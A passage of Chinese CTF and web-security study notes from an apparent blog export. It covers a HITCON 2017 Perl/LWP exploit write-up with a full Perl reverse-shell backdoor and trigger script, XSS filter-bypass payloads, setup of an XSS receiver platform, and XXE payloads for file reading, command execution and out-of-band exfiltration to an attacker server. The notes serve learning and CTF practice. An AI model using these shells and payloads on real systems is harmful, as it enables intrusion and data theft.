HREF="./"&gt;./&lt;/A&gt;&lt;LI&gt;&lt;A HREF="../"&gt;../&lt;/A&gt;&lt;LI&gt;&lt;A HREF=".dockerenv"&gt;.dockerenv&lt;/A&gt;&lt;LI&gt;&lt;A HREF="bin/"&gt;bin/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="boot/"&gt;boot/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="dev/"&gt;dev/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="etc/"&gt;etc/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="flag"&gt;flag&lt;/A&gt;&lt;LI&gt;&lt;A HREF="home/"&gt;home/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="lib/"&gt;lib/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="lib64/"&gt;lib64/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="media/"&gt;media/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="mnt/"&gt;mnt/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="opt/"&gt;opt/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="proc/"&gt;proc/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="readflag"&gt;readflag&lt;/A&gt;&lt;LI&gt;&lt;A HREF="root/"&gt;root/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="run/"&gt;run/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="run.sh"&gt;run.sh&lt;/A&gt;&lt;LI&gt;&lt;A HREF="sbin/"&gt;sbin/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="srv/"&gt;srv/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="sys/"&gt;sys/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="tmp/"&gt;tmp/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="usr/"&gt;usr/&lt;/A&gt;&lt;LI&gt;&lt;A HREF="var/"&gt;var/&lt;/A&gt;&lt;/UL&gt;&lt;/BODY&gt;&lt;/HTML&gt;可以看到根目录下有flag和readflag两个文件，应该是通过执行readflag获取flag学习大佬博客后，发现考点在 perlhttps://www.jianshu.com/p/3f82685f56a8 （参看题解）Perl语言与LWP简介Perl 是 Practical Extraction and Report Language 的缩写，可翻译为 “实用报表提取语言”。Perl 借用了C、sed、awk、shell脚本以及很多其他编程语言的特性。Perl 最重要的特性是Perl内部集成了正则表达式的功能，以及巨大的第三方代码库CPAN。Perl 语言的应用范围很广，除CGI以外，Perl被用于图形编程、系统管理、网络编程、金融、生物以及其他领域。由于其灵活性，Perl被称为++脚本语言++中的瑞士军刀。学习链接安装kali自带：perl -v基本语法Perl 程序由声明与语句组成，程序自上而下执行，包含了循环，条件控制，每个语句以分号 (;) 结束。没有缩进要求。Perl文件以.pl结尾Perl 有三个基本的数据类型：标量、数组、哈希。在使用时在变量的名字前面加上一个”$”,表示是标量，如：1$mysecond="123"; #字符串123数组变量以字符”@”开头，索引从0开始，如：1@arr=(1,2,3)哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值。哈希变量以字符”%”开头。1%h=('a'=&gt;1,'b'=&gt;2);循环条件语句类似php或python，比较灵活文件操作：open函数sysopen函数close函数123456open(DATA, "&lt;file.txt"); #使用 open 函数以只读的方式(&lt;)打开文件 file.txt：open(DATA, "&gt;file.txt") or die "file.txt 文件无法打开, $!"; # &gt;表示写入方式。open(DATA, "+&lt;file.txt"); #以读写方式打开文件，可以在 &gt; 或 &lt; 字符前添加 + 号open(DATA,"&gt;&gt;file.txt"); #&gt;&gt; 表示向现有文件的尾部追加数据，如果需要读取要追加的文件内容可以添加 + 号#DATA为文件句柄用于读取文件close(DATA)123456#!/usr/bin/perlopen(DATA,"&lt;import.txt") or die "无法打开数据";@lines = &lt;DATA&gt;;print @lines; # 输出数组内容close(DATA);特殊变量Perl Socket 编程（主要涉及到perl反弹shell）Perl面向对象面向对象有很多基础概念，这里我们接收三个：对象、类和方法。https://blog.csdn.net/yangfangjit/article/details/72904444（关于写一个类）对象：对象是对类中数据项的引用。.类：类是个Perl包，其中含提供对象方法的类。Perl 类的文件后缀为 .pm。方法：方法是个Perl子程序，类名是其第一个参数。package 类名 —&gt; 定义类/包名sub 方法名 —&gt; 定义方法use/require 类名 —&gt; 调用类（或者说载入一个模块）new 类名() —&gt; 创建对象my —&gt;声明一个局部变量our —&gt;声明一个全局变量……从一个包中访问另外一个包的变量，可通过” 包名 + 双冒号( :: ) + 变量名 “ 的方式指定。use和require在使用方式上是有区别的，详情百度。关于perl的类、包、模块 —&gt; http://blog.chinaunix.net/uid-27464093-id-3308003.htmlLWPLWP是Library for WWW access in Perl的缩写，是一个由多个模块组成，用来获取网络数据的的模块组。 关于LWP的话，已经有专门的书了，内容比较复杂。。。这里做简单介绍参考资料：perl中LWP与WEB的基本使用为什么关注LWP呢，我们可以用man查一下GET这个命令，下面是一部分内容：1234LWP-REQUEST(1p) User Contributed Perl Documentation LWP-REQUEST(1p)NAME lwp-request, GET, POST, HEAD - Simple command line user agent关于这道题，考查的是perl5的CVE-2016-1238 ,当解析遇到了非定义的协议(定义的协议在perl5/LWP/Protocol文件夹下可以看到, 默认支持GHTTP、cpan、data、file、ftp、gopher、http、https、loopback、mailto、nntp、nogo协议)时, 会自动读取当前目录下的URI目录并查看是否有对应协议的pm模块并尝试eval “require xxx” 这里我们的恶意pm模块就会被执行。### 构造Perl后门这里是利用上面的漏洞向目录中写入恶意pm包，然后通过访问未知协议触发恶意脚本，反弹shell。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/usr/bin/perl#usage:#nc -vv -l -p PORT(default 1988) on your local system first,then#Perl $0 Remote IP(default 127.0.0.1) Remote_port(default 1988)#Type 'exit' to exit or press Enter to gain shell when u under the 'console'.#nc -vv -l -p 1988#perl backdoor.pl 127.0.0.1 1988#use strict;use Socket;use IO::Socket;use Cwd;use IO::Handle;my $remote = $ARGV[0] || "vps的ip地址";my $remote_port = $ARGV[1] || 1988;my $pack_addr = sockaddr_in( $remote_port, inet_aton($remote) );my $path = cwd();$ARGC = @ARGV;if ( $ARGV[0] !~ /-/ ) &#123; socket( SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp') ) or die "socket error: "; STDOUT-&gt;autoflush(1); SOCKET-&gt;autoflush(1); $conn = connect( SOCKET, $pack_addr ) || die "connection error : $!"; open STDIN, "&gt;&amp;SOCKET"; open STDOUT, "&gt;&amp;SOCKET"; open STDERR, "&gt;&amp;SOCKET"; print "You are in $path\n"; print "Welcome to use.\n"; print "console&gt;\n"; while (&lt;STDIN&gt;) &#123; chomp; if ( lc($_) eq 'exit' ) &#123; print " Bye Bye!"; exit; &#125; $msg = system($_); if ($msg) &#123; print STDOUT "\n$msg\n"; print STDOUT "console&gt;"; &#125; else &#123; print "console&gt;"; &#125; &#125; close SOCKET; exit;&#125;攻击实施步骤：准备恶意pm包：首先要在自己vps上写好perl后门，确保服务器能访问到（国外的可能被墙）下载后门：1234567891011121314151617#coding:utf-8import requestsimport hashliburl='http://117.50.3.97:8004/'dir1='orange'+'发起请求ip地址';hl = hashlib.md5()hl.update(dir1.encode(encoding='utf-8'))payload='?filename=/URI/e0145f75.pm&amp;url=pm包地址' #e0145f75为随意构造的未知协议response = requests.get(url+payload)print response.textvps监听端口1nc -vv -l -p 1988 //vps上监听端口发起url请求触发漏洞：1http://117.50.3.97:8004/?filename=xxxxxx&amp;url=e0145f75://123vps上收到反弹shell，执行根目录readflag，获得flag{d9faf0e7-6152-48be-8c5c-479c9681bcf3}]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>HITCON2017</tag>
        <tag>ssrf</tag>
        <tag>Perl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181011）：vps搭建xss平台]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181011%EF%BC%89%EF%BC%9Avps%E6%90%AD%E5%BB%BAxss%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[vps上搭建xss平台前主要进行的环境准备（视自己情况）：部署apache服务器安装php安装mysql安装phpmyadminvps：centos71.搭建apache第一步：安装Apache服务程序(apache服务的软件包名称叫做httpd)1yum install httpd -yPS：Yum(全称为 Yellow dogUpdater, Modified)是一个==在Fedora和RedHat以及CentOS==中的Shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。第二步： 将Apache服务添加到 开机自启中123systemctl start httpdsystemctl enable httpdsystemctl status httpdPS: systemctl该命令可用于查看系统状态和管理系统及服务 详细附：Apache主要文件文件目录服务目录/etc/httpd主配置文件/etc/httpd/conf/httpd.conf网站数据目录/var/www/html访问日志/var/log/httpd/access_log错误日志/var/log/httpd/error_log2.安装php第一步 配置yum源首先检查一下之前装了php没有，因为之后安装xss平台时需要5.5以上版本的php，所以可能会遇到升级php版本的问题12yum list installed | grep php #查看之前安的（没有略过）yum remove php-..... #（删除相关文件）1234567891011添加 yum 源CentOS 6.x 的源# rpm -Uvh http://download.Fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpmCentOS 7.x 的源# rpm -Uvh http://ftp.iij.ad.jp/pub/linux/fedora/epel/7/x86_64/e/epel-release-7-5.noarch.rpm# rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm第二步 安装php及相关插件1yum install -y php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64 php70w-fpm其他版本php安装如果想安装php5.5或者5.6版本，将上面的php70w替换为php55w或者php56w就可以了。1php -v 查看版本3.安装mysql看链接4.安装phpmyadmin主要是便于数据库可视化管理第一步 下载1wget https://files.phpmyadmin.net/phpMyAdmin/4.8.3/phpMyAdmin-4.8.3-all-languages.tar.gz第二步 直接解压到web目录登录密码为mysql数据库密码第三步 修改配置(用处不大)找到config.sample.inc.php文件，改名为config.inc.php5.安装xss平台这个平台是蓝莲花战队一个成员的开源项目，项目地址：https://github.com/firesunCN/BlueLotus_XSSReceiver具体操作看链接]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记：XSS构造剖析]]></title>
    <url>%2F2018%2F12%2F05%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%9AXSS%E6%9E%84%E9%80%A0%E5%89%96%E6%9E%90%EF%BC%88%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[绕过xss过滤0x01 用户不能构造自己的html标记绕过思路：利用现有html标签属性值（低版本的浏览器如ie6可能有此漏洞）举例：12&lt;table background='javascript:alert(/xss/)'&gt;&lt;/table&gt;&lt;img src="javascript:alert(/xss/);"&gt;说明：不是所有标记的属性值都能产生xss，通常只有引用文件的属性才能触发，如：href lowsrc bgsound background value action dynsrc(经过测试，相当一部分的属性值无法在高版本的浏览中实现攻击，因为浏览器会将js代码当做url访问而不会认为是js。可以用的有herf，但是需要点击，无法自动触发)1&lt;a href="javascript:alert(/xss/)"&gt;touch me！&lt;/a&gt;0x02 敏感字过滤绕过思路1:ascii编码1&lt;img src=1 onerror=&amp;#0000097lert(/xss/)&gt;说明：格式：&amp;#+（可以补0）+ascii编码还可以把&amp;#01、&amp;02等字符插入到javascript或Vbscript的头部，tab符&amp;#9、换行符&amp;#10、回车符&amp;#13可以插入到代码中任意地方（未复现成功）注意这是因为浏览器对html对ascii的支持所致，在\中就不行了 绕过思路2:十六进制编码 1&lt;img src=1 onerror=&amp;#x61lert(/xss/)&gt; eval()函数+十六进制编码 12&lt;script&gt;eval("alert('XSS')");&lt;/script&gt;&lt;script&gt;eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\53\x27\x29")&lt;/script&gt; eval()函数+String.fromCharCode()函数+10进制（ascii） 1&lt;img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&gt; 说明：js支持unicode、escapes、十六进制、八进制等编码形式 0x03 属性值无法跨站绕过思路:产生自己的事件 0x02中思路1的例子就是利用onerror事件，除此之外，防止过滤，还有以下事件可供测试： onResume onReverse onRowDelete onRowInserted onSeek onSynchRestored onTimeError OnTrackChange onURIFlip onRepeat onMediaComplete onMediaError onPause onProgress onOutOfSync oncontrolselect onlayoutcomplete onafterprint onbeforeprint ondataavailable ondatasetcomplete ondatasetchanged onerrorupdate onrowenter onrowexit onrowsdelete onselectionchange onbounce onstop onresizeend 说明：注意事件的触发条件 0x04 利用CSS跨站（不常用）思路:12345&lt;div style="background-image:url(javascript:alert('xss'))"&gt;&lt;style&gt; body &#123;background-image:url("javascript:alert('xss')");&#125;&lt;/style&gt; 或者使用expression执行js代码12345&lt;div style="width:expression(alert('xss'));"&gt;&lt;img src='#' style="xss:expression(alert(/xss/));"&gt;&lt;style&gt; body&#123;background-image:expression(alert("xss"));&#125;&lt;/style&gt; css属性可以自定义，如果css属性后面为一段js表达式，则其值等于js表达式计算的结果。 12&lt;div style="list-style-image:url(javascript:alert('xss'))"&gt;&lt;img style="background-image:url(javascript:alert('xss'))"&gt; 上面最后一条代码相当于 12&lt;img src='javascript:alert('xss')'&gt;//现在浏览器一般都无法用这种方式了 说明：各浏览器不能通用，甚至同一浏览器不同版本之间不能通用（测试未通过）。 0x05 特殊字符过滤过滤空格: 注释绕过1&lt;img/**/src='1'/**/onerror=alert(/xss/)&gt; 0x06 加密绕过微软提供了脚本加密功能，可对脚本加密，包括JScript和VBScript，经过加密的脚本可在IE下运行，其他浏览器则不能识别。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>web</tag>
        <tag>waf</tag>
        <tag>《XSS跨站脚本攻击剖析与防御》</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181024）：XHR与跨域问题]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181024%EF%BC%89%EF%BC%9AXHR%E4%B8%8E%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[XMLHttpRequestXMLHttpRequest 对象用于在后台与服务器交换数据。XMLHttpRequest是Ajax开发中的核心对象，Ajax 即“Asynchronous Javascript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。在不重新加载页面的情况下更新网页在页面已加载后从服务器请求数据在页面已加载后从服务器接收数据在后台向服务器发送数据XMLHttpRequest 详解示例123456789101112131415161718192021222324252627282930function ajax(url,postData,fnSuc)&#123; var xhr; if(window.XMLHttpRequest)&#123; xhr= new XMLHttpRequest(); //console.log(xhr); &#125;else&#123; // alert("不存在"); xhr= new ActiveXObject("Microsoft.XMLHTTP"); //alert(xhr); &#125;//XMLHttpRequest兼容性处理 xhr.open("POST", url , true);//指定请求的方式post/get,url,true/false(异步/同步) xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xhr.onreadystatechange = function()&#123;//请求状态改变时触发 var XMLHttpReq = xhr; if (XMLHttpReq.readyState == 4) &#123;//数据接受完成 if (XMLHttpReq.status == 200) &#123;//服务器返回的http状态码,200表示成功 var text = XMLHttpReq.responseText;//服务器响应的文本内容 fnSuc(JSON.parse(text));//请求成功时返回的数据 &#125; &#125; &#125;; postData = (function(obj)&#123; // 转成post需要的字符串 var str = ""; for(var prop in obj)&#123; str += prop + "=" + obj[prop] + "&amp;" &#125; return str; &#125;)(postData); xhr.send(postData);//向服务器发送请求&#125;方法1. 创建 XMLHttpRequest 对象123xmlhttp=new XMLHttpRequest();//老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象：xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");下面是建立XHR对象的常用方法：123456789xhr=null;if (window.XMLHttpRequest) &#123;// code for all new browsers xhr=new XMLHttpRequest(); &#125;else if (window.ActiveXObject) &#123;// code for IE5 and IE6 xhr=new ActiveXObject("Microsoft.XMLHTTP"); &#125;2. open：创建请求1xhr.open('请求方式','请求url',是异步|同步)我们通过XMLHttpRequest对象的open函数打开对服务器的连接，设置请求方式如GET POST OPTION DELETE等，请求路径，同步请求或者是异步请求(true表示异步请求，false表示同步请求)3. setRequestHeader：更改请求包头123456var client = new XMLHttpRequest();client.open('GET', 'demo.cgi');client.setRequestHeader('X-Test', 'one');client.setRequestHeader('X-Test', 'two');// 最终request header中"X-Test"为: one, twoclient.send();setRequestHeader必须在open()方法之后，send()方法之前调用，否则会抛错；该函数可以调用多次，且采用追加的方式。4. send(null/参数)：发出请求发送请求,不传值时可以写null，get或者post请求传值时可以写键值对 username=zhangsan&amp;pwd=12345POST请求时，一定要注意要设置 Content-Type: application/x-www-form-urlencoded 不然无法解析&amp;分隔符。5. getAllResponseHeaders()：获取响应头信息6. getResponseHeader(String header)：获取指定响应头信息7. Abort()：停止当前http请求属性1. readyState：XMLHttpRequest对象的状态如果需要接收的是异步响应，这就需要检测XHR对象的readyState属性，该属性表示请求/响应过程的当前活动阶段。这个属性可取的值如下：0(UNSENT):未初始化。尚未调用open()方法 1(OPENED):启动。已经调用open()方法，但尚未调用send()方法 2(HEADERS_RECEIVED):发送。己经调用send()方法，且接收到头信息 3(LOADING):接收。已经接收到部分响应主体信息 4(DONE):完成。已经接收到全部响应数据，而且已经可以在客户端使用了 理论上，只要readyState属性值由一个值变成另一个值，都会触发一次readystatechange事件。可以利用这个事件来检测每次状态变化后readyState的值。通常，我们对readyState值为4的阶段感兴趣，因为这时所有数据都已就绪2. Onreadystatechange：状态改变事件触发器当 XMLHttpRequest 对象的状态发生改变时，会触发此函数。状态从 0 (uninitialized) 到 4 (complete) 进行变化。（readyState变化时会调用这个属性上注册的javascript函数）3. responseText服务器响应的文本内容4. responseXML服务器响应的XML内容对应的DOM对象5. status服务器返回的http状态码。200表示“成功”，404表示“未找到”，500表示“服务器内部错误”等。6. statusText服务器返回状态的文本信息。跨域方式CORS（跨域资源共享）为了实现不同网站之间的通信，浏览器实现了一种共享资源的方式。例如a.com要获取b.com的内容，那么就要在a.com的页面中设置CORS头部12header(&apos;Access-Control-Allow-Origin:http://b.com&apos;);header(&apos;Access-Control-Allow_Origin:*&apos;);window.nameiframe和window.name结合可以实现跨域传输，即使父窗口和子窗口的源不同，也可以获取window.name的值123456789&lt;script&gt; function getData()&#123; var iframe = document.getElementById('ifr'); iframe.onload = function()&#123; var data = iframe.contentWindow.name; &#125; iframe.src = 'b.html';&#125;&lt;/script&gt;Jsonp123456789&lt;script&gt; function _callback(s)&#123; alert(JSON.stringify(s));&#125;&lt;/script&gt;&lt;script src="http://example.com/json.php?cb=_callback"&gt;&lt;/script&gt;http://example.com/json.php?cb=_callback的响应结果类似：__Jquery(&#123;"id":1,"content":"hello"&#125;)原理是script标签可以跨域请求（类似的还有img等），这里jsonp请求获取到的是一串js代码，一般是一个函数调用，参数就是想要跨域获取的数据，而函数的实现在发起请求的页面中。获取完毕后，调用该函数，即可获取数据并进行后续处理。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>XHR</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181013）：护网杯签到题——编解码问题]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181013%EF%BC%89%EF%BC%9A%E6%8A%A4%E7%BD%91%E6%9D%AF%E7%AD%BE%E5%88%B0%E9%A2%98%E2%80%94%E2%80%94%E7%BC%96%E8%A7%A3%E7%A0%81%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[easy_xor题目：1AAoHAR1WI1BRX1RQJ1AgJVdfI1VXJ1JTJ1BVXiIjVyRRIiMlJRs=题目提示为异或观察，可能是base64，在线解码是乱码，这时要用脚本跑。不要认为乱码就是错的，往下就走不了，试一试对其进行编码或进一步解码。这个时候尽量不要用在线解码，容易出错。常用的ctf编码解码函数有：123456ord() 将单个字符转为asciichr() 将ascii转为字符b64decode()rot13()url编解码//如有其他请补充所以按位对解码后的字符进行异或。那么用什么异或呢？首先知道flag的形式为flag{.+}，所以第一个异或出来的猜测是f。利用xor特点，反求参与xor的参数，base64解码后第一位与f异或结果为f。第二位还是f，第三位也是……于是用f循环异或整个字符串，得到flag。下面脚本：123456789#coding:utf-8import base64a='AAoHAR1WI1BRX1RQJ1AgJVdfI1VXJ1JTJ1BVXiIjVyRRIiMlJRs='a=base64.b64decode(a)b=''for i in a: b=b+chr(ord(i)^ord('f')); print b]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>护网杯</tag>
        <tag>编解码</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20181023）：XML及XXE外部实体注入攻击]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820181023%EF%BC%89%EF%BC%9AXML%E5%8F%8AXXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[1 xml学习1.1 特性XML 指可扩展标记语言（EXtensible Markup Language）XML 的设计宗旨是传输数据，而非显示数据XML 标签没有被预定义。您需要自行定义标签。XML 是不作为的。1.2 web开发XML把数据从HTML分离，通过JavaScript读取一个外部XML文件，然后更新 HTML 中的数据内容。不兼容系统之间交换数据1.3 xml文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version="1.0"?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt;1.4 语法规则XML 文档必须有根元素XML 文档必须有关闭标签XML 标签对大小写敏感XML 元素必须被正确的嵌套XML 属性必须加引号1.5 DTD文档类型定义文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。内部的 DOCTYPE 声明：1&lt;!DOCTYPE 根元素 [元素声明]&gt;外部文档声明：1&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;声明一个元素：12&lt;!ELEMENT 元素名称 类别&gt; 或&lt;!ELEMENT 元素名称 (元素内容)&gt;DTD实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。（举个例子：有时候可能在多个文档中调用同样的内容，比如公司名称、版权声明等，为了避免重复输入这些内容，我们可以声明一个实体来表示这些内容，在文档中只需要引用这个实体。在XML处理器对这个文档进行分析处理后，引用实体的位置会被实体的内容所替换。）内部实体声明：1&lt;!ENTITY 实体名称 "实体的值"&gt;一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例123&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe "Thinking"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;外部实体声明：1&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;外部实体，用来引入外部资源，有++SYSTEM和PUBLIC++两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：123file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php示例：1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;&lt;/methodcall&gt;这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&amp;xxe被存放在了methodname元素中，造成了敏感信息的泄露。参数实体声明：123&lt;!ENTITY % 实体名称 “实体的值”&gt;or&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;参数实体的引用只能在 DTD文档中使用，所以在xml文档内部就不能引用2 XML外部实体攻击（XXE）相关实验当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。2.1 利用姿势1、任意文件读取12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;passwd;&lt;/value&gt;&lt;/foo&gt;12345678&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;绕过无回显：可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。1234567&lt;?xml version=”1.0”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"&gt; # /etc/issue&lt;!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"&gt;%dtd;%send;]&gt;evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。1234&lt;!ENTITY % all“&lt;!ENTITY &amp;#x25; send SYSTEM ‘http://xxx.xxx.xxx/?%file;’&gt;”&gt;%all;有报错直接查看报错信息。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。2、执行系统命令12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM "expect://id"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/foo&gt;该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。3、内网探测1234567891011&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = "1.0"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM "http://192.168.1.1:80/"&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。2.2 参考文章https://www.cnblogs.com/zhaijiahui/p/9147595.html#autoid-5-0-0 （比较全面，包含ctf例题）http://blog.sina.com.cn/s/blog_54c367d40101anca.htmlhttps://www.cnblogs.com/miyeah/p/4526088.html]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>waf</tag>
        <tag>XXE</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习笔记（20180827）：bool盲注+各种姿势绕过过滤和替换]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8820180827%EF%BC%89%EF%BC%9Abool%E7%9B%B2%E6%B3%A8%2B%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%92%8C%E6%9B%BF%E6%8D%A2%2F</url>
